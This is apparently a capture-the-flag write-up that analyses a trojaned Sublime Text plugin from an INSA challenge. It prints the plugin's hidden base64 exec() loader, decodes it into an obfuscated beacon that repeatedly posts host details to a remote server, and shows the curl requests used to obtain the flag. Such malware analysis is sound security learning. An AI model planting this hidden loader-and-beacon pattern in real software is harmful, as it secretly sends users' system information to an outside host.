## Worm in Apple

### [~$ cd ..](../)

We are given an [archive](DoxyDoxygen.sublime-package), which is a ST3 plugin. We first did:

> ```
> ~$ uncompyle6 -o . ~/Téléchargements/insa/DoxyDoxygen/doxy_libs/*.pyc
> ```

but it was useless since the only relevant file was [Doxy.py](Doxy.py).
Actually, we first looked for strings such as 'INSA', 'flag', etc. and by looking for 'base64' we found a suspicious string in this file:

> ```python
>try:
>   import base64;
>	A=b'IyAgICAgICAvIVwgRk9SIEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWSAvIVwKQT0nNy4yemJ2LWJuMDB5cmNwNHNjdi0zcnA1MnY0OWJ2LTNuY3MyJwpCPTQ0MwpDPScwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXotLicKaW1wb3J0IHRpbWU7aW1wb3J0IHJlcXVlc3RzO2ltcG9ydCBwbGF0Zm9ybTtmcm9tIHV1aWQgaW1wb3J0IHV1aWQ0O2Zyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZGVmIHcoKToKICAgIGksdT1zdHIodXVpZDQoKSksJ2h0dHBzOi8ve306e30ve30nLmZvcm1hdCgnJy5qb2luKFtDWyhDLmluZGV4KGUpLTB4MGQpJWxlbihDKV0gZm9yIGUgaW4gQV0pLEIsJycuam9pbihbY2hyKGVeMHg0MikgZm9yIGUgaW4gWzQ0LDQ1LDU0LDQzLDM2LDU5XV0pKQogICAgd2hpbGUgVHJ1ZTpyZXF1ZXN0cy5wb3N0KHUsanNvbj17J3V1aWQnOmksJ25vZGUnOnBsYXRmb3JtLm5vZGUoKSwncGxhdGZvcm0nOnBsYXRmb3JtLnBsYXRmb3JtKCl9KTt0aW1lLnNsZWVwKDUpCnQ9VGhyZWFkKHRhcmdldD13KQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOnQuc3RhcnQoKTt0LmpvaW4oKQplbHNlOnQuZGFlbW9uPVRydWU7dC5zdGFydCgpCg==';
>	exec(base64.b64decode(A));
>except:
>    pass
>
>fix_import()
> ```

Okay, let's decode and beautify it:

> ```python
>#       /!\ FOR EDUCATIONAL PURPOSE ONLY /!\
>A='7.2zbv-bn00yrcp4scv-3rp52v49bv-3ncs2'
>B=443
>C='0123456789abcdefghijklmnopqrstuvwxyz-.'
>import time;
>import requests;
>import platform;
>from uuid import uuid4;
>from threading import Thread
>def w():
>    i,u=str(uuid4()),'https://{}:{}/{}'.format(''.join([C[(C.index(e)-0x0d)%len(C)] for e in A]),B,''.join([chr(e^0x42) for e in [44,45,54,43,36,59]]))
>    while True:
>		requests.post(u,json={'uuid':i,'node':platform.node(),'platform':platform.platform()});
>		time.sleep(5)
>t=Thread(target=w)
>if __name__ == '__main__':
>	t.start();
>	t.join()
>else:
>	t.daemon=True;
>	t.start()
> ```

The first decoded the URL in routine `w()` and found: http://worm-in-apple.ctf.insecurity-insa.fr:443/notify.

By sending a GET request on https://worm-in-apple.ctf.insecurity-insa.fr, and looking at the source code, we found another base64-encoded string:

> ```
><!-- [yo! dev! remove me! or not...]
>   LyAgICAgICAgLT4geW91J3JlIGxvb2tpbicgYXQgaXQKICAgICAgICAgICAgL25vd
>   GlmeSAgLT4gdGhlIGJlYWNvbiBlbmRwb2ludAogICAgICAgICAgICAvZmxhZyAgIC
>   AtPiB0aGUgZmxhZyBlbnBvaW50Li4uIGJ1dCBkb24ndCBnZXQgdG8gY29ja3kgdGh
>   lcmUKICAgICAgICAgICAgICAgICAgICAgICAgYXJlIHNvbWUgcmVxdWlyZW1lbnRz
>   Lg==
> -->
> ```

Let's decode it:

> ```
>/        -> you're lookin' at it
>            /notify  -> the beacon endpoint
>            /flag    -> the flag enpoint... but don't get to cocky there
>                        are some requirements.
> ```

We tried to send a GET on /flag in order to know what were the requirements, and got the message: *give me your uuid man... :/*

We the retried with an uuid given by `w()` and got: *your cookie missing or maybe you don't know what HMAC means :(*

A cookie was required, and we guessed that /notify could give us one:

> ```
> ~$ curl -v --data '{"node":"root","platform":"Linux-4.9.0-6-amd64-x86_64-with-debian-9.4","uuid":"a6a85ca9-9456-4739-897f-b35bcf06fece"}' https://worm-in-apple.ctf.insecurity-insa.fr/notify
>	*   Trying 147.135.132.95...
>	* TCP_NODELAY set
>	* Connected to worm-in-apple.ctf.insecurity-insa.fr (147.135.132.95) port 443 (#0)
>	* ALPN, offering h2
>	* ALPN, offering http/1.1
>	* Cipher selection: ALL:!EXPORT:!EXPORT40:!EXPORT56:!aNULL:!LOW:!RC4:@STRENGTH
>	* successfully set certificate verify locations:
>	*   CAfile: /etc/ssl/certs/ca-certificates.crt
>	  #CApath: /etc/ssl/certs
>	* TLSv1.2 (OUT), TLS header, Certificate Status (22):
>	* TLSv1.2 (OUT), TLS handshake, Client hello (1):
>	* TLSv1.2 (IN), TLS handshake, Server hello (2):
>	* TLSv1.2 (IN), TLS handshake, Certificate (11):
>	* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
>	* TLSv1.2 (IN), TLS handshake, Server finished (14):
>	* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
>	* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
>	* TLSv1.2 (OUT), TLS handshake, Finished (20):
>	* TLSv1.2 (IN), TLS change cipher, Client hello (1):
>	* TLSv1.2 (IN), TLS handshake, Finished (20):
>	* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256
>	* ALPN, server did not agree to a protocol
>	* Server certificate:
>	*  subject: CN=*.ctf.insecurity-insa.fr
>	*  start date: Mar 25 13:12:35 2018 GMT
>	*  expire date: Jun 23 13:12:35 2018 GMT
>	*  subjectAltName: host "worm-in-apple.ctf.insecurity-insa.fr" matched cert's "*.ctf.insecurity-insa.fr"
>	*  issuer: C=US; O=Let's Encrypt; CN=Let's Encrypt Authority X3
>	*  SSL certificate verify ok.
>	> POST /notify HTTP/1.1
>	> Host: worm-in-apple.ctf.insecurity-insa.fr
>	> User-Agent: curl/7.52.1
>	> Accept: */*
>	> Content-Length: 78
>	> Content-Type: application/x-www-form-urlencoded
>	> 
>	* upload completely sent off: 78 out of 78 bytes
>	< HTTP/1.1 200 OK
>	< Date: Sun, 08 Apr 2018 10:54:22 GMT
>	< Set-Cookie: uuid="2|1:0|10:1523184862|4:uuid|68:YTZhODVjYTktOTQ1Ni00NzM5LTg5N2YtYjM1YmNmMDZmZWNlWzEwLjQyLjgxLjU3XQ==|d423bf0b62ef133989acdea930b2eb60ebdc418d483d0f62d6aed88c753f1b78"; expires=Tue, 08 May 2018 10:54:22 GMT; Path=/
>	< Content-Length: 22
>	< Server: TornadoServer/5.0.1
>	< Content-Type: text/html; charset=UTF-8
>	< 
>	* Curl_http_done: called premature == 0
>	* Connection #0 to host worm-in-apple.ctf.insecurity-insa.fr left intact
>	thank you very much :
> ```

Let's replay the request with the cookie, and get the flag: **INSA{30880b4d7e6726f5614eb57d0c6d9e7aa23e9cbbae89a6c91aebb9d0352bc53b}**

